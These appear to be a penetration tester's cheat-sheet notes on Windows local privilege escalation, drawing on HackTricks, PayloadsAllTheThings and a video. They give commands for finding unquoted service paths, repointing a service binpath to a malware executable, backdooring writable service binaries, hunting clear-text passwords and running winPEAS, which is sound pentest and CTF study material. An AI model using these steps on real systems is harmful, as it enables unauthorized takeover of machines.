
##### source : https://www.youtube.com/watch?v=Jb69o19x-8k

#### Methodologies
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation


### Unquoted service path
```
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ # to list service with unquoted path
accesschk.exe /accepteula -dquv "C:\path\to\folder\" # check permissions

# more info at https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths
```

### Insecure service permission
```powershell
accesschk.exe /accepteula -uwcqv #list all service you can edit
# edit servic (in cmd.exe)
sc qc service-name # query service infos
sc config service-name binpath="C:\path\to\malware.exe" # edit a value in the service configuration
net stop service-name # restart a service
net start service-name
```

> accesschk.exe is from the sysinternals suite

## Insecure service executable
If you have write permission on the binary pointed by the binpath of a service configuration, you can just backdoor this executable

## Search for clear password
```powershell
# search the file system for clear password
# then a reminder of the runas command
runas /user:user cmd.exe

# tips : don't forget runasCS : https://github.com/antonioCoco/RunasCs
```

## Check installed application and potential CVE
Location to check for outdated programs:
- C:/Program Files(x86)
- C:/Program Files


### Automated tools 
- winpeas : https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

Upload `winPeas.exe` (prefer the `.exe` to the `.bat`) to the target computer, run it and redirect output to `winPeas.txt`
```powershell
PS C:\Users\matthew\Documents> .\winPEASx64.exe > winPeas.txt
```

Then download back the output to your attacker machine, if you are working on a linux, you have to convert endianness before reading it
```
$ file winPeas.txt
winPeas.txt: Unicode text, UTF-16, little-endian text, with very long lines (412), with CRLF line terminators, with escape sequences
$ iconv -f utf-16le -t utf-8 winPeas.txt -o result.txt
$ file result.txt
result.txt: Unicode text, UTF-8 (with BOM) text, with very long lines (412), with CRLF line terminators, with escape sequences
```

Then use `less -r result.txt` to read the file